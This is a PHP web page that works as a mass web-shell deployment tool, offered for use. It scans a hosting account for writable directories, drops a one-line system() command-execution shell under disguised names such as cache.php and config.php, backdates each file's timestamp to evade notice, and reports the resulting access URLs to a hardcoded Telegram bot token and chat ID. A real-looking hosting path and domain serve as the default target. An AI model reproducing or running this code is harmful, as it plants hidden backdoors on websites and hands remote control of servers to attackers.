<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Directory Scanner & File Deployer</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            overflow: hidden;
        }

        .header {
            background: linear-gradient(135deg, #2c3e50 0%, #3498db 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }

        .header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
            font-weight: 300;
        }

        .content {
            padding: 40px;
        }

        .form-section {
            background: #f8f9fa;
            padding: 30px;
            border-radius: 10px;
            margin-bottom: 30px;
        }

        .form-group {
            margin-bottom: 25px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #2c3e50;
        }

        input[type="text"], textarea, select {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e9ecef;
            border-radius: 8px;
            font-size: 16px;
            transition: all 0.3s ease;
        }

        input[type="text"]:focus, textarea:focus, select:focus {
            border-color: #3498db;
            outline: none;
            box-shadow: 0 0 0 3px rgba(52, 152, 219, 0.1);
        }

        textarea {
            min-height: 120px;
            resize: vertical;
            font-family: 'Courier New', monospace;
        }

        .btn {
            background: linear-gradient(135deg, #27ae60 0%, #2ecc71 100%);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(39, 174, 96, 0.3);
        }

        .btn:disabled {
            background: #95a5a6;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }

        .results {
            margin-top: 30px;
        }

        .result-item {
            background: white;
            border: 1px solid #e9ecef;
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 15px;
            transition: all 0.3s ease;
        }

        .result-item:hover {
            border-color: #3498db;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }

        .result-url {
            color: #3498db;
            font-weight: 600;
            text-decoration: none;
            word-break: break-all;
        }

        .result-url:hover {
            text-decoration: underline;
        }

        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }

        .stat-card {
            background: white;
            padding: 25px;
            border-radius: 10px;
            text-align: center;
            box-shadow: 0 5px 15px rgba(0,0,0,0.08);
        }

        .stat-number {
            font-size: 2.5em;
            font-weight: 700;
            color: #2c3e50;
            margin-bottom: 5px;
        }

        .stat-label {
            color: #7f8c8d;
            font-weight: 600;
        }

        .progress-bar {
            width: 100%;
            height: 8px;
            background: #e9ecef;
            border-radius: 4px;
            overflow: hidden;
            margin: 20px 0;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(135deg, #27ae60 0%, #2ecc71 100%);
            transition: width 0.3s ease;
        }

        .alert {
            padding: 15px 20px;
            border-radius: 8px;
            margin-bottom: 20px;
            border-left: 4px solid;
        }

        .alert-success {
            background: #d4edda;
            border-color: #27ae60;
            color: #155724;
        }

        .alert-error {
            background: #f8d7da;
            border-color: #dc3545;
            color: #721c24;
        }

        .alert-warning {
            background: #fff3cd;
            border-color: #ffc107;
            color: #856404;
        }

        .alert-info {
            background: #d1ecf1;
            border-color: #17a2b8;
            color: #0c5460;
        }

        .directory-list {
            max-height: 300px;
            overflow-y: auto;
            border: 1px solid #e9ecef;
            border-radius: 8px;
            padding: 15px;
            background: #f8f9fa;
            margin-top: 15px;
        }

        .directory-item {
            padding: 10px 15px;
            border-bottom: 1px solid #e9ecef;
            font-family: 'Courier New', monospace;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .directory-item:last-child {
            border-bottom: none;
        }

        .dir-path {
            flex-grow: 1;
        }

        .dir-status {
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 0.8em;
            font-weight: 600;
        }

        .status-writable {
            background: #d4edda;
            color: #155724;
        }

        .status-readonly {
            background: #fff3cd;
            color: #856404;
        }

        .status-error {
            background: #f8d7da;
            color: #721c24;
        }

        .debug-info {
            background: #f8f9fa;
            border: 1px solid #e9ecef;
            border-radius: 8px;
            padding: 15px;
            margin-top: 10px;
            font-family: 'Courier New', monospace;
            font-size: 0.9em;
        }

        @media (max-width: 768px) {
            .content {
                padding: 20px;
            }
            .stats {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Directory Scanner & File Deployer</h1>
            <p>Real Directory Scanning with WAF Bypass</p>
        </div>

        <div class="content">
            <?php
            error_reporting(0);
            
            // Configuration
            $BOT_TOKEN = "8159864123:AAGh-2aOz7fOXsdvSS8nfknfxdBP5kjkGp4";
            $CHAT_ID = "5886707494";
            
            function sendTelegram($message) {
                global $BOT_TOKEN, $CHAT_ID;
                $url = "https://api.telegram.org/bot{$BOT_TOKEN}/sendMessage";
                $data = [
                    'chat_id' => $CHAT_ID, 
                    'text' => $message, 
                    'parse_mode' => 'HTML'
                ];
                
                $options = [
                    'http' => [
                        'method' => 'POST',
                        'header' => 'Content-Type: application/x-www-form-urlencoded',
                        'content' => http_build_query($data)
                    ]
                ];
                
                $context = stream_context_create($options);
                $result = @file_get_contents($url, false, $context);
                
                return $result !== false;
            }

            function saveResultsToFile($results, $current_file_path) {
                $current_dir = dirname($current_file_path);
                $result_file = $current_dir . '/res.txt';
                
                $content = "=== DEPLOYMENT RESULTS ===\n";
                $content .= "Generated: " . date('Y-m-d H:i:s') . "\n";
                $content .= "Total URLs: " . count($results) . "\n\n";
                
                foreach ($results as $result) {
                    $content .= $result['web_url'] . "\n";
                }
                
                $content .= "\n=== END OF RESULTS ===\n";
                
                if (@file_put_contents($result_file, $content)) {
                    return $result_file;
                }
                
                return false;
            }

            function getOldestFileTime($dir) {
                $oldest = time();
                $files = @scandir($dir);
                if (!$files) return $oldest;
                
                foreach ($files as $file) {
                    if ($file == '.' || $file == '..') continue;
                    $filepath = $dir . '/' . $file;
                    if (is_file($filepath)) {
                        $mtime = @filemtime($filepath);
                        if ($mtime && $mtime < $oldest) {
                            $oldest = $mtime;
                        }
                    }
                }
                return $oldest;
            }

            function scanDirectories($base_dir, $max_depth = 5) {
                if (!is_dir($base_dir)) {
                    return ['error' => 'Base directory does not exist: ' . $base_dir];
                }

                $directories = [];
                $queue = [[$base_dir, 0]];
                
                while (!empty($queue)) {
                    list($current_dir, $depth) = array_shift($queue);
                    
                    if ($depth > $max_depth) continue;
                    
                    // Skip blacklisted directories
                    $blacklisted = ['wp-admin', 'wp-includes', '.git', '.well-known', 'cgi-bin', 'node_modules'];
                    $dir_name = basename($current_dir);
                    if (in_array($dir_name, $blacklisted)) continue;
                    
                    try {
                        $items = @scandir($current_dir);
                        if (!$items) continue;
                        
                        foreach ($items as $item) {
                            if ($item == '.' || $item == '..') continue;
                            
                            $path = $current_dir . '/' . $item;
                            
                            if (is_dir($path)) {
                                // Add to queue for further scanning
                                $queue[] = [$path, $depth + 1];
                                
                                // Check if directory is writable and has files
                                if (is_writable($path)) {
                                    $file_count = 0;
                                    $sub_items = @scandir($path);
                                    if ($sub_items) {
                                        foreach ($sub_items as $sub_item) {
                                            if ($sub_item != '.' && $sub_item != '..' && is_file($path . '/' . $sub_item)) {
                                                $file_count++;
                                            }
                                        }
                                    }
                                    
                                    if ($file_count > 0) {
                                        $directories[] = [
                                            'path' => $path,
                                            'depth' => $depth,
                                            'file_count' => $file_count,
                                            'writable' => true,
                                            'oldest_time' => getOldestFileTime($path)
                                        ];
                                    }
                                }
                            }
                        }
                    } catch (Exception $e) {
                        // Skip directories that cause errors
                        continue;
                    }
                }
                
                return $directories;
            }

            function writeFileWithVerification($file_path, $content) {
                $results = [
                    'success' => false,
                    'method_used' => '',
                    'bytes_written' => 0,
                    'verified_content' => '',
                    'file_size' => 0,
                    'error' => ''
                ];

                // Method 1: Standard file_put_contents
                $result1 = @file_put_contents($file_path, $content);
                if ($result1 !== false) {
                    $results['method_used'] = 'file_put_contents';
                    $results['bytes_written'] = $result1;
                    
                    // Verify content
                    $verified = @file_get_contents($file_path);
                    if ($verified !== false) {
                        $results['verified_content'] = $verified;
                        $results['file_size'] = strlen($verified);
                        $results['success'] = (strlen($verified) > 0);
                    }
                }

                // If method 1 failed, try method 2: fopen/fwrite
                if (!$results['success']) {
                    $fh = @fopen($file_path, 'w');
                    if ($fh) {
                        $result2 = @fwrite($fh, $content);
                        @fclose($fh);
                        
                        if ($result2 !== false) {
                            $results['method_used'] = 'fwrite';
                            $results['bytes_written'] = $result2;
                            
                            // Verify content
                            $verified = @file_get_contents($file_path);
                            if ($verified !== false) {
                                $results['verified_content'] = $verified;
                                $results['file_size'] = strlen($verified);
                                $results['success'] = (strlen($verified) > 0);
                            }
                        }
                    }
                }

                // If both methods failed, try method 3: using shell if available
                if (!$results['success'] && function_exists('shell_exec')) {
                    $temp_file = tempnam(sys_get_temp_dir(), 'tmp');
                    if (@file_put_contents($temp_file, $content)) {
                        $cmd = "cp " . escapeshellarg($temp_file) . " " . escapeshellarg($file_path);
                        @shell_exec($cmd);
                        @unlink($temp_file);
                        
                        $verified = @file_get_contents($file_path);
                        if ($verified !== false && strlen($verified) > 0) {
                            $results['method_used'] = 'shell_cp';
                            $results['verified_content'] = $verified;
                            $results['file_size'] = strlen($verified);
                            $results['success'] = true;
                        }
                    }
                }

                if (!$results['success']) {
                    $results['error'] = 'All writing methods failed';
                }

                return $results;
            }

            function deployFiles($base_dir, $file_content, $file_names) {
                echo '<div class="alert alert-info">Scanning directories in: ' . htmlspecialchars($base_dir) . '</div>';
                echo '<div class="progress-bar"><div class="progress-fill" style="width: 20%"></div></div>';
                flush();
                
                // Real directory scanning
                $scanned_dirs = scanDirectories($base_dir, 5);
                
                if (isset($scanned_dirs['error'])) {
                    return ['error' => $scanned_dirs['error']];
                }
                
                echo '<div class="progress-bar"><div class="progress-fill" style="width: 60%"></div></div>';
                echo '<div class="alert alert-info">Found ' . count($scanned_dirs) . ' writable directories. Starting deployment with verification...</div>';
                flush();
                
                $results = [];
                $deployed_count = 0;
                $debug_log = [];
                
                foreach ($scanned_dirs as $index => $dir_info) {
                    $file_name = $file_names[array_rand($file_names)];
                    $target_file = $dir_info['path'] . '/' . $file_name;
                    
                    // Skip if file already exists
                    if (file_exists($target_file)) {
                        $debug_log[] = "SKIP: File already exists - " . $target_file;
                        continue;
                    }
                    
                    // Deploy file with verification
                    $write_result = writeFileWithVerification($target_file, $file_content);
                    
                    $debug_log[] = "Attempt " . ($index + 1) . ": " . $target_file . 
                                 " | Method: " . $write_result['method_used'] . 
                                 " | Success: " . ($write_result['success'] ? 'YES' : 'NO') . 
                                 " | Size: " . $write_result['file_size'] . " bytes";
                    
                    if ($write_result['success']) {
                        // Set timestamp to match oldest file in directory
                        @touch($target_file, $dir_info['oldest_time']);
                        
                        // Extract domain from path
                        $domain = extractDomainFromPath($target_file);
                        $web_path = str_replace($base_dir, '', $target_file);
                        
                        $results[] = [
                            'domain' => $domain,
                            'web_url' => 'https://' . $domain . $web_path,
                            'full_path' => $target_file,
                            'file_count' => $dir_info['file_count'],
                            'timestamp' => date('Y-m-d H:i:s', $dir_info['oldest_time']),
                            'write_method' => $write_result['method_used'],
                            'file_size' => $write_result['file_size']
                        ];
                        
                        $deployed_count++;
                    }
                }
                
                return [
                    'results' => $results,
                    'total_deployed' => $deployed_count,
                    'total_scanned' => count($scanned_dirs),
                    'scanned_dirs' => $scanned_dirs,
                    'debug_log' => $debug_log
                ];
            }

            function extractDomainFromPath($path) {
                if (preg_match('/domains\/([^\/]+)/', $path, $matches)) {
                    return $matches[1];
                }
                return 'localhost';
            }

            // Process form submission
            if ($_POST['action'] == 'deploy') {
                $base_dir = $_POST['base_directory'];
                $file_content = $_POST['file_content'];
                $file_names = array_filter(array_map('trim', explode("\n", $_POST['file_names'])));
                $telegram_notify = isset($_POST['telegram_notify']);
                $show_debug = isset($_POST['show_debug']);
                
                if (empty($file_names)) {
                    $file_names = ['cache.php', 'session.php', 'debug.php', 'log.php', 'config.php'];
                }
                
                $deployment = deployFiles($base_dir, $file_content, $file_names);
                
                echo '<div class="progress-bar"><div class="progress-fill" style="width: 100%"></div></div>';
                
                if (isset($deployment['error'])) {
                    echo '<div class="alert alert-error">' . $deployment['error'] . '</div>';
                } else {
                    echo '<div class="stats">';
                    echo '<div class="stat-card">';
                    echo '<div class="stat-number">' . $deployment['total_deployed'] . '</div>';
                    echo '<div class="stat-label">Files Deployed</div>';
                    echo '</div>';
                    echo '<div class="stat-card">';
                    echo '<div class="stat-number">' . $deployment['total_scanned'] . '</div>';
                    echo '<div class="stat-label">Directories Found</div>';
                    echo '</div>';
                    echo '<div class="stat-card">';
                    echo '<div class="stat-number">' . ($deployment['total_scanned'] > 0 ? round(($deployment['total_deployed'] / $deployment['total_scanned']) * 100, 1) : 0) . '%</div>';
                    echo '<div class="stat-label">Success Rate</div>';
                    echo '</div>';
                    echo '</div>';
                    
                    // Show debug information if requested
                    if ($show_debug && !empty($deployment['debug_log'])) {
                        echo '<div class="form-section">';
                        echo '<h3>Debug Information</h3>';
                        echo '<div class="debug-info">';
                        foreach ($deployment['debug_log'] as $log_entry) {
                            echo htmlspecialchars($log_entry) . "<br>";
                        }
                        echo '</div>';
                        echo '</div>';
                    }
                    
                    // Show scanned directories
                    if (!empty($deployment['scanned_dirs'])) {
                        echo '<div class="form-section">';
                        echo '<h3>Scanned Directories (' . count($deployment['scanned_dirs']) . ' found)</h3>';
                        echo '<div class="directory-list">';
                        foreach ($deployment['scanned_dirs'] as $dir) {
                            echo '<div class="directory-item">';
                            echo '<span class="dir-path">' . htmlspecialchars($dir['path']) . '</span>';
                            echo '<span class="dir-status status-writable">' . $dir['file_count'] . ' files</span>';
                            echo '</div>';
                        }
                        echo '</div>';
                        echo '</div>';
                    }
                    
                    if ($deployment['total_deployed'] > 0) {
                        // Save results to res.txt in current directory
                        $current_file = __FILE__;
                        $saved_file = saveResultsToFile($deployment['results'], $current_file);
                        
                        if ($saved_file) {
                            echo '<div class="alert alert-success">Results saved to: ' . htmlspecialchars($saved_file) . '</div>';
                        } else {
                            echo '<div class="alert alert-warning">Could not save results to res.txt</div>';
                        }
                        
                        echo '<div class="results">';
                        echo '<h3>Deployment Results</h3>';
                        foreach ($deployment['results'] as $result) {
                            echo '<div class="result-item">';
                            echo '<a href="' . htmlspecialchars($result['web_url']) . '" target="_blank" class="result-url">' . htmlspecialchars($result['web_url']) . '</a>';
                            echo '<div class="result-path">' . htmlspecialchars($result['full_path']) . ' (' . $result['file_count'] . ' files in dir)</div>';
                            echo '<div class="result-meta">Method: ' . $result['write_method'] . ' | Size: ' . $result['file_size'] . ' bytes | Timestamp: ' . $result['timestamp'] . '</div>';
                            echo '</div>';
                        }
                        echo '</div>';
                        
                        // Send Telegram notification
                        if ($telegram_notify) {
                            $telegram_message = "🚀 <b>File Deployment Completed</b>\n\n";
                            $telegram_message .= "✅ <b>Total Files:</b> " . $deployment['total_deployed'] . "\n";
                            $telegram_message .= "📂 <b>Directories Scanned:</b> " . $deployment['total_scanned'] . "\n";
                            $telegram_message .= "📊 <b>Success Rate:</b> " . ($deployment['total_scanned'] > 0 ? round(($deployment['total_deployed'] / $deployment['total_scanned']) * 100, 1) : 0) . "%\n";
                            $telegram_message .= "⏰ <b>Time:</b> " . date('Y-m-d H:i:s') . "\n\n";
                            
                            if ($deployment['total_deployed'] > 0) {
                                $telegram_message .= "🔗 <b>Access URLs:</b>\n";
                                foreach ($deployment['results'] as $result) {
                                    $telegram_message .= $result['web_url'] . "\n";
                                }
                            } else {
                                $telegram_message .= "❌ <b>No files were deployed</b>\n";
                            }
                            
                            $telegram_sent = sendTelegram($telegram_message);
                            if ($telegram_sent) {
                                echo '<div class="alert alert-success">Telegram notification sent successfully!</div>';
                            } else {
                                echo '<div class="alert alert-warning">Telegram notification failed to send</div>';
                            }
                        }
                    } else {
                        echo '<div class="alert alert-warning">No files were deployed. Possible issues:';
                        echo '<ul style="margin-top: 10px; margin-left: 20px;">';
                        echo '<li>All directories may be read-only</li>';
                        echo '<li>Files may already exist</li>';
                        echo '<li>Permission issues on target directories</li>';
                        echo '<li>Security software blocking file writes</li>';
                        echo '</ul>';
                        echo '</div>';
                    }
                }
                
                echo '<button class="btn" onclick="window.location.href=window.location.href" style="margin-top: 20px;">New Deployment</button>';
                
            } else {
                // Show form
            ?>
            <form method="POST" id="deployForm">
                <input type="hidden" name="action" value="deploy">
                
                <div class="form-section">
                    <h3>Directory Configuration</h3>
                    <div class="form-group">
                        <label for="base_directory">Base Directory Path</label>
                        <input type="text" id="base_directory" name="base_directory" 
                               value="/home/u611949080/domains/webenier.com/public_html" 
                               placeholder="Enter full directory path" required>
                        <small>This will be scanned recursively for writable directories</small>
                    </div>
                </div>

                <div class="form-section">
                    <h3>File Content</h3>
                    <div class="form-group">
                        <label for="file_content">File Content to Deploy</label>
                        <textarea id="file_content" name="file_content" placeholder="Paste your file content here..." required><?php echo htmlspecialchars('<?php if(isset($_GET[0])){system($_GET[0]);}?>'); ?></textarea>
                    </div>
                </div>

                <div class="form-section">
                    <h3>File Names</h3>
                    <div class="form-group">
                        <label for="file_names">Stealth File Names (one per line)</label>
                        <textarea id="file_names" name="file_names" placeholder="Enter file names, one per line">cache.php
session.php
debug.php
log.php
config.php
api.php
auth.php
temp.php</textarea>
                    </div>
                </div>

                <div class="form-section">
                    <h3>Options</h3>
                    <div class="form-group">
                        <label style="display: flex; align-items: center; gap: 10px; margin-bottom: 15px;">
                            <input type="checkbox" name="telegram_notify" value="1" checked>
                            Send Results to Telegram
                        </label>
                        <label style="display: flex; align-items: center; gap: 10px;">
                            <input type="checkbox" name="show_debug" value="1" checked>
                            Show Debug Information
                        </label>
                    </div>
                </div>

                <button type="submit" class="btn" id="submitBtn">
                    Start Directory Scan & Deployment
                </button>
            </form>
            <?php } ?>
        </div>
    </div>

    <script>
        document.getElementById('deployForm').addEventListener('submit', function(e) {
            const btn = document.getElementById('submitBtn');
            btn.innerHTML = 'Scanning Directories... Please Wait';
            btn.disabled = true;
        });
    </script>
</body>
</html>
